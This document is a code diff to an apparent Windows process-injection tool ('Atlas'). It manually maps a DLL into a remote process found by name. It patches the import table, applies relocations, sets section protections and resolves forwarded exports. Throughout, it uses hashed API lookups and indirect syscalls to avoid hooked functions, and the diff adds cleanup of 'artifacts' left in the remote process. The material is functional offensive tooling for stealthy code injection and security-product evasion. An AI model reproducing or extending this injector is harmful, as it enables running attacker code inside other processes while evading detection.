@@ -1,6 +1,21 @@
 #include <win32.h>
 
-void ErrorCallback(const char* msg, DWORD lastError, NTSTATUS status, ATLAS_UTILS* atlas_utils, TARGET_DATA* target_data, BOOL freeMem){
+BOOL CleanArtifacts(ATLAS_UTILS* atlas_utils, ARTIFACT_DATA* artifact_data){
+    bool cleaned = TRUE;
+
+    fnNtFreeVirtualMemory sysInvoke = (fnNtFreeVirtualMemory)C_SyscallPrepare(atlas_utils, atlas_utils->atlas_syscalls.NtFreeVirtualMemory);
+    NTSTATUS statusSys = sysInvoke(artifact_data->hRemote, &artifact_data->pTargetAddr, &artifact_data->imageSize, MEM_RELEASE);
+    if(!NT_SUCCESS(statusSys)){
+        printf("%s - Error while cleaning artifacts, remote process probably died. NTSTATUS: %lx\n", err, statusSys);
+        cleaned = FALSE;
+    }
+
+    C_SyscallCleanup(atlas_utils, (PVOID)sysInvoke);
+
+    return cleaned;
+}
+
+VOID ErrorCallback(const char* msg, DWORD lastError, NTSTATUS status, ATLAS_UTILS* atlas_utils, ARTIFACT_DATA* artifact_data, BOOL freeMem){
     if(lastError){
         printf("%s - %s -> lastError: %d\n", err, msg, lastError);
     }
@@ -9,14 +24,10 @@ void ErrorCallback(const char* msg, DWORD lastError, NTSTATUS status, ATLAS_UTIL
     }
 
     if(freeMem){
-        fnNtFreeVirtualMemory sysInvoke = (fnNtFreeVirtualMemory)C_SyscallPrepare(atlas_utils, atlas_utils->atlas_syscalls.NtFreeVirtualMemory);
-
-        if(!NT_SUCCESS(sysInvoke(target_data->hRemote, &target_data->pTargetAddr, &target_data->imageSize, MEM_RELEASE))){
-            printf("Error on free NTSTATUS: %lx", status);
+        printf("%s - Cleaning artifacts from remote\n", info);
+        if(CleanArtifacts(atlas_utils, artifact_data)){
+            printf("%s - Artifacts cleaned from remote\n", ok);
         }
-
-        C_SyscallCleanup(atlas_utils, (PVOID)sysInvoke);
-
     }
 
     exit(EXIT_FAILURE);
@@ -35,7 +46,7 @@ DWORD FindTargetPid(LPCWSTR target, ATLAS_UTILS* atlas_utils){
     status = sysInvoke(SystemProcessInformation, pSpi, returnLength, NULL);
     
     if(!NT_SUCCESS(status)){
-        ErrorCallback("PID find failed", 0, status, NULL, NULL, FALSE);
+        ErrorCallback("Error while searching PID", 0, status, NULL, NULL, FALSE);
     }
 
     C_SyscallCleanup(atlas_utils, (PVOID)sysInvoke);
@@ -54,7 +65,7 @@ DWORD FindTargetPid(LPCWSTR target, ATLAS_UTILS* atlas_utils){
     }
 
     if(pid == 0){
-        ErrorCallback("PID find failed", GetLastError(), 0, NULL, NULL, FALSE);
+        ErrorCallback("PID not found", GetLastError(), 0, NULL, NULL, FALSE);
     }
 
     printf("%s - PID of the target process: %ld\n\n", info, pid);
@@ -62,7 +73,7 @@ DWORD FindTargetPid(LPCWSTR target, ATLAS_UTILS* atlas_utils){
     return pid;
 }
 
-void PatchIAT(PVOID pLocalMappingAddr, DLL_DATA dll_data, ATLAS_UTILS* atlas_utils, TARGET_DATA* target_data){
+VOID PatchIAT(PVOID pLocalMappingAddr, DLL_DATA dll_data, ATLAS_UTILS* atlas_utils, ARTIFACT_DATA* artifact_data){
     if(dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size){
         PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)pLocalMappingAddr + dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 
@@ -73,10 +84,10 @@ void PatchIAT(PVOID pLocalMappingAddr, DLL_DATA dll_data, ATLAS_UTILS* atlas_uti
         while(pImportDescriptor->Name){
             char * dllName = (char*)((DWORD_PTR)pLocalMappingAddr + pImportDescriptor->Name);
 
-            printf("\t%s - Fixing DLL: %s\n", info, dllName);
+            printf("\t\t%s - Fixing DLL: %s\n", info, dllName);
 
             if(!C_LoadLibrary(dllName, &hDll, atlas_utils)){
-                ErrorCallback("Error patching IAT", -1, -1, atlas_utils, target_data, TRUE);
+                ErrorCallback("Error patching IAT", -1, -1, atlas_utils, artifact_data, TRUE);
             }
 
             RetrieveDLL_DATA((PVOID)hDll, &iat_entry_dll_data);
@@ -86,22 +97,22 @@ void PatchIAT(PVOID pLocalMappingAddr, DLL_DATA dll_data, ATLAS_UTILS* atlas_uti
 
             while(pOriginalFirstThunk->u1.AddressOfData){
                 if(IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)){
-                    procAddr = C_GetProcAddress(iat_entry_dll_data, NULL, IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal));
+                    procAddr = C_GetProcAddress(iat_entry_dll_data, NULL, IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal), atlas_utils);
                     if(procAddr != -1){
                         pIAT->u1.Function = procAddr;
                     }
                     else{
-                        ErrorCallback("Error patching IAT", -1, -1, atlas_utils, target_data, TRUE);
+                        ErrorCallback("Error patching IAT", -1, -1, atlas_utils, artifact_data, TRUE);
                     }
                 }
                 else{
                     PIMAGE_IMPORT_BY_NAME pFunction = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)pLocalMappingAddr + pOriginalFirstThunk->u1.AddressOfData);
-                    procAddr = C_GetProcAddress(iat_entry_dll_data, C_HashString(ConvertCharToWideChar(pFunction->Name)), NULL);
+                    procAddr = C_GetProcAddress(iat_entry_dll_data, C_HashString(ConvertCharToWideChar(pFunction->Name)), NULL, atlas_utils);
                     if(procAddr != -1){
                         pIAT->u1.Function = procAddr;
                     }
                     else{
-                        ErrorCallback("Error patching IAT", -1, -1, atlas_utils, target_data, TRUE);
+                        ErrorCallback("Error patching IAT", -1, -1, atlas_utils, artifact_data, TRUE);
                     }
                 }
          
@@ -114,9 +125,9 @@ void PatchIAT(PVOID pLocalMappingAddr, DLL_DATA dll_data, ATLAS_UTILS* atlas_uti
     }
 }
 
-void FixRelocations(PVOID pTargetAddr, PVOID pLocalMappingAddr, DLL_DATA dll_data){
+VOID FixRelocations(PVOID pTargetAddr, PVOID pLocalMappingAddr, DLL_DATA dll_data){
     DWORD_PTR delta = (DWORD_PTR)pTargetAddr - dll_data.preferedAddr;
-    
+
     if(delta != 0){
         PIMAGE_BASE_RELOCATION pRelocRowData = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pLocalMappingAddr + dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
         PBASE_RELOCATION_ENTRY pRelocationEntries = NULL;
@@ -127,7 +138,7 @@ void FixRelocations(PVOID pTargetAddr, PVOID pLocalMappingAddr, DLL_DATA dll_dat
             numTableEntries = (pRelocRowData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
             pRelocationEntries = (PBASE_RELOCATION_ENTRY)(pRelocRowData + 1); 
 
-            for(size_t i = 0; i < numTableEntries; i++, pRelocationEntries++){
+            for(SIZE_T i = 0; i < numTableEntries; i++, pRelocationEntries++){
                 PDWORD_PTR pEntryValue = (PDWORD_PTR)((LPBYTE)pLocalMappingAddr + (pRelocRowData->VirtualAddress + pRelocationEntries->Offset));
 
                 if(pRelocationEntries->Type == IMAGE_REL_BASED_DIR64){
@@ -149,19 +160,23 @@ void FixRelocations(PVOID pTargetAddr, PVOID pLocalMappingAddr, DLL_DATA dll_dat
     }
 }
 
-void FixMemoryProtections(TARGET_DATA* target_data, DLL_DATA dll_data, ATLAS_UTILS* atlas_utils){            
+VOID FixMemoryProtections(ARTIFACT_DATA* artifact_data, PVOID pLocalMappingAddr, DLL_DATA dll_data, ATLAS_UTILS* atlas_utils){ 
+    DWORD_PTR delta = (DWORD_PTR)artifact_data->pTargetAddr - (DWORD_PTR)pLocalMappingAddr;
+   
     DWORD sectionHeaderOffset = dll_data.dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS);
-
     PIMAGE_SECTION_HEADER pSectionHeader = new IMAGE_SECTION_HEADER;
+
+    DWORD IAT_rva = dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
 
     fnNtProtectVirtualMemory sysInvoke = (fnNtProtectVirtualMemory)C_SyscallPrepare(atlas_utils, atlas_utils->atlas_syscalls.NtProtectVirtualMemory);
 
-    for(size_t i = 0; i < dll_data.fileHeader->NumberOfSections; i++){        
-        DWORD_PTR sectionHeaderAddr = DWORD_PTR((DWORD_PTR)target_data->pTargetAddr + sectionHeaderOffset + i * sizeof(IMAGE_SECTION_HEADER));
-  
-        ReadProcessMemory(target_data->hRemote, (LPCVOID)sectionHeaderAddr, pSectionHeader, sizeof(IMAGE_SECTION_HEADER), NULL);
+    for(SIZE_T i = 0; i < dll_data.fileHeader->NumberOfSections; i++){        
+        DWORD_PTR sectionHeaderAddr = DWORD_PTR((DWORD_PTR)pLocalMappingAddr + sectionHeaderOffset + i * sizeof(IMAGE_SECTION_HEADER));
+        pSectionHeader = (PIMAGE_SECTION_HEADER)sectionHeaderAddr;
 
-        PVOID pSectionAddr = (PVOID)((DWORD_PTR)target_data->pTargetAddr + pSectionHeader->VirtualAddress);
+        sectionHeaderAddr += delta;
+
+        PVOID pSectionAddr = (PVOID)((DWORD_PTR)artifact_data->pTargetAddr + pSectionHeader->VirtualAddress);
         SIZE_T sectionSize = pSectionHeader->Misc.VirtualSize;
         ULONG protection = 0;
         ULONG oldProtection = 0;
@@ -186,11 +201,29 @@ void FixMemoryProtections(TARGET_DATA* target_data, DLL_DATA dll_data, ATLAS_UTI
         }
         if((pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) &&(pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE)){
             protection = PAGE_EXECUTE_READWRITE;
+        }  
+
+        if(IAT_rva >= pSectionHeader->VirtualAddress && IAT_rva < (pSectionHeader->VirtualAddress + pSectionHeader->SizeOfRawData)){
+            if (!(protection & PAGE_WRITECOPY)){
+                switch (protection) {
+                    case PAGE_READONLY:
+                        protection = PAGE_READWRITE;
+                        break;
+                    case PAGE_EXECUTE:
+                        protection = PAGE_EXECUTE_WRITECOPY;
+                        break;
+                    case PAGE_EXECUTE_READ:
+                        protection = PAGE_EXECUTE_READWRITE;
+                        break;
+                    default:
+                        break;
+                }
+            }
         }
 
-        NTSTATUS status = sysInvoke(target_data->hRemote, &pSectionAddr, &sectionSize, protection, &oldProtection);
+        NTSTATUS status = sysInvoke(artifact_data->hRemote, &pSectionAddr, &sectionSize, protection, &oldProtection);
         if (!NT_SUCCESS(status)) {
-            ErrorCallback("Memory protection failed", 0, status, atlas_utils, target_data, TRUE);
+            ErrorCallback("Memory protection failed", 0, status, atlas_utils, artifact_data, TRUE);
         }    
     }
 
@@ -235,8 +268,51 @@ BOOL C_LoadLibrary(char* dllName, PHANDLE pHDll, ATLAS_UTILS* atlas_utils){
     return TRUE;
 }
 
-size_t C_GetProcAddress(DLL_DATA dll_data, DWORD targetFuncHash, WORD ordinal){ 
-    PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dll_data.baseAddr + dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+std::pair<DLL_DATA, DWORD> C_PrepareForwardedProc(SIZE_T funcAddr, ATLAS_UTILS* atlas_utils){
+    char* rawFuncContent = new char[MAX_PATH];
+    char* forwardedDLL = new char[MAX_PATH];
+    char* forwardedFunction = new char[MAX_PATH];
+
+    memcpy(rawFuncContent, (PVOID)funcAddr, MAX_PATH);
+
+    SIZE_T dotIndex = 0;
+    while(rawFuncContent[dotIndex] != '.'){
+        dotIndex++;
+    }
+
+    memcpy(forwardedDLL, (PVOID)funcAddr, dotIndex);
+    forwardedDLL[dotIndex] = '\0';
+
+    strcat(forwardedDLL, ".dll");
+
+    SIZE_T forwardedFunctionSize = StrLength((char*)funcAddr + dotIndex + 1);
+    memcpy(forwardedFunction, (PVOID)funcAddr + dotIndex + 1, forwardedFunctionSize);
+    forwardedFunction[forwardedFunctionSize] = '\0';
+
+    HANDLE hDll;
+    PVOID pModule;
+    
+    pModule = C_GetModuleHandle(C_HashString(ConvertCharToWideChar(forwardedDLL)));
+
+    if(pModule == NULL){
+        if(!C_LoadLibrary(forwardedDLL, &hDll, atlas_utils)){
+            ErrorCallback("Error loading forwarded function module", -1, -1, atlas_utils, NULL, FALSE);
+        }
+
+        pModule = (PVOID) hDll;
+    }
+    
+    
+    DLL_DATA dll_forward_data;
+    RetrieveDLL_DATA(pModule, &dll_forward_data); 
+
+    return std::make_pair(dll_forward_data, C_HashString(ConvertCharToWideChar(forwardedFunction)));
+}
+
+size_t C_GetProcAddress(DLL_DATA dll_data, DWORD targetFuncHash, WORD ordinal, ATLAS_UTILS* atlas_utils){ 
+    IMAGE_DATA_DIRECTORY pExportedDir = dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+
+    PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dll_data.baseAddr + pExportedDir.VirtualAddress);
 
     PDWORD pFuncNames = (PDWORD)((DWORD_PTR)dll_data.baseAddr + pExportTable->AddressOfNames);
     PDWORD pFuncAddrs = (PDWORD)((DWORD_PTR)dll_data.baseAddr + pExportTable->AddressOfFunctions);
@@ -249,6 +325,12 @@ size_t C_GetProcAddress(DLL_DATA dll_data, DWORD targetFuncHash, WORD ordinal){
         if(ordinal != NULL){
             if(funcOrdinal[i] == ordinal){
                 size_t funcAddr = (size_t)((DWORD_PTR)dll_data.baseAddr + pFuncAddrs[pOrdinals[i]]);
+
+                if(funcAddr >= (DWORD_PTR) pExportTable && funcAddr < ((SIZE_T)pExportTable + pExportedDir.Size)){
+                    std::pair<DLL_DATA, DWORD> forwardedFunc = C_PrepareForwardedProc(funcAddr, atlas_utils);
+                    funcAddr = C_GetProcAddress(forwardedFunc.first, forwardedFunc.second, NULL, atlas_utils);
+                }
+
                 return funcAddr;  
             }
         }
@@ -256,6 +338,12 @@ size_t C_GetProcAddress(DLL_DATA dll_data, DWORD targetFuncHash, WORD ordinal){
             wchar_t* wfuncName = ConvertCharToWideChar(funcName);
             if(wfuncName != NULL && C_HashString(wfuncName) == targetFuncHash){
                 size_t funcAddr = (size_t)((DWORD_PTR)dll_data.baseAddr + pFuncAddrs[pOrdinals[i]]);
+
+                if(funcAddr >= (DWORD_PTR)pExportTable && funcAddr < ((SIZE_T)pExportTable + pExportedDir.Size)){
+                    std::pair<DLL_DATA, DWORD> forwardedFunc = C_PrepareForwardedProc(funcAddr, atlas_utils);
+                    funcAddr = C_GetProcAddress(forwardedFunc.first, forwardedFunc.second, NULL, atlas_utils);
+                }
+                
                 return funcAddr; 
             }
         }
@@ -313,7 +401,7 @@ VOID C_SyscallCleanup(ATLAS_UTILS* atlas_utils, PVOID pStubAddr){
 }
 
 
-void RetrieveDLL_DATA(PVOID pDllAddr, DLL_DATA* dll_data){
+VOID RetrieveDLL_DATA(PVOID pDllAddr, DLL_DATA* dll_data){
     PIMAGE_DOS_HEADER pDosHeader;
     PIMAGE_NT_HEADERS pNtHeader;
 
@@ -340,53 +428,55 @@ void RetrieveDLL_DATA(PVOID pDllAddr, DLL_DATA* dll_data){
     dll_data->entryPoint = dll_data->optHeader->AddressOfEntryPoint;
 }
 
-void RetrieveUtils(ATLAS_UTILS* atlas_utils){
+VOID RetrieveUtils(ATLAS_UTILS* atlas_utils){
     DLL_DATA dll_data; 
 
     PVOID pNtpDllAddress = C_GetModuleHandle(Sys_Ntdll);
 
     if(pNtpDllAddress == NULL){
-        ErrorCallback("Retrieve of NTDLL handle failed", GetLastError(), 0, NULL, NULL, FALSE);
+        ErrorCallback("Retrieve of MODULE handle failed", GetLastError(), 0, NULL, NULL, FALSE);
     }
     
     RetrieveDLL_DATA(pNtpDllAddress, &dll_data);
 
-    fnLdrLoadDll pLdrLoadDll = (fnLdrLoadDll)C_GetProcAddress(dll_data, Sys_LdrLoadDll, NULL);
+    fnLdrLoadDll pLdrLoadDll = (fnLdrLoadDll)C_GetProcAddress(dll_data, Sys_LdrLoadDll, NULL, NULL);
     if(pLdrLoadDll == NULL){
         ErrorCallback("Retrieve of aux func 1 failed", GetLastError(), 0, NULL, NULL, FALSE);
     }
 
-    fnNtWriteVirtualMemory pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)C_GetProcAddress(dll_data, Sys_NtWriteVirtualMemory, NULL);
+    fnNtWriteVirtualMemory pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)C_GetProcAddress(dll_data, Sys_NtWriteVirtualMemory, NULL, NULL);
     if(pNtWriteVirtualMemory == NULL){
         ErrorCallback("Retrieve of aux func 2 failed", GetLastError(), 0, NULL, NULL, FALSE);
     }
 
-    fnNtAllocateVirtualMemory pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwAllocateVirtualMemory, NULL);
+    fnNtAllocateVirtualMemory pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwAllocateVirtualMemory, NULL, NULL);
     if(pNtAllocateVirtualMemory == NULL){
         ErrorCallback("Retrieve of aux func 3 failed", GetLastError(), 0, NULL, NULL, FALSE);
     }
 
-    fnNtFreeVirtualMemory pNtFreeVirtualMemory = (fnNtFreeVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwFreeVirtualMemory, NULL);
+    fnNtFreeVirtualMemory pNtFreeVirtualMemory = (fnNtFreeVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwFreeVirtualMemory, NULL, NULL);
     if(pNtFreeVirtualMemory == NULL){
         ErrorCallback("Retrieve of aux func 4 failed", GetLastError(), 0, NULL, NULL, FALSE);
     }
 
-    fnNtProtectVirtualMemory pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwProtectVirtualMemory, NULL);
+    fnNtProtectVirtualMemory pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwProtectVirtualMemory, NULL, NULL);
     if(pNtProtectVirtualMemory == NULL){
         ErrorCallback("Retrieve of aux func 5 failed", GetLastError(), 0, NULL, NULL, FALSE);
     }
 
+    atlas_utils->atlas_syscalls.NtOpenProcess.ssn = C_RetrieveSSN(Sys_ZwOpenProcess, dll_data);
     atlas_utils->atlas_syscalls.NtAllocateVirtualMemory.ssn = C_RetrieveSSN(Sys_ZwAllocateVirtualMemory, dll_data);
     atlas_utils->atlas_syscalls.NtProtectVirtualMemory.ssn = C_RetrieveSSN(Sys_ZwProtectVirtualMemory, dll_data);
     atlas_utils->atlas_syscalls.NtQuerySystemInformation.ssn = C_RetrieveSSN(Sys_ZwQuerySystemInformation, dll_data);
     atlas_utils->atlas_syscalls.NtCreateThreadEx.ssn = C_RetrieveSSN(Sys_ZwCreateThreadEx, dll_data);
     atlas_utils->atlas_syscalls.NtFreeVirtualMemory.ssn = C_RetrieveSSN(Sys_ZwFreeVirtualMemory, dll_data);
 
-    atlas_utils->atlas_syscalls.NtAllocateVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwAllocateVirtualMemory, NULL));
-    atlas_utils->atlas_syscalls.NtProtectVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwProtectVirtualMemory, NULL));
-    atlas_utils->atlas_syscalls.NtQuerySystemInformation.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwQuerySystemInformation, NULL));
-    atlas_utils->atlas_syscalls.NtCreateThreadEx.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwCreateThreadEx, NULL));
-    atlas_utils->atlas_syscalls.NtFreeVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwFreeVirtualMemory, NULL));
+    atlas_utils->atlas_syscalls.NtOpenProcess.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwOpenProcess, NULL, NULL));
+    atlas_utils->atlas_syscalls.NtAllocateVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwAllocateVirtualMemory, NULL, NULL));
+    atlas_utils->atlas_syscalls.NtProtectVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwProtectVirtualMemory, NULL, NULL));
+    atlas_utils->atlas_syscalls.NtQuerySystemInformation.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwQuerySystemInformation, NULL, NULL));
+    atlas_utils->atlas_syscalls.NtCreateThreadEx.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwCreateThreadEx, NULL, NULL));
+    atlas_utils->atlas_syscalls.NtFreeVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwFreeVirtualMemory, NULL, NULL));
 
     atlas_utils->pLdrLoadDll = pLdrLoadDll;
     atlas_utils->pNtWriteVirtualMemory = pNtWriteVirtualMemory; 
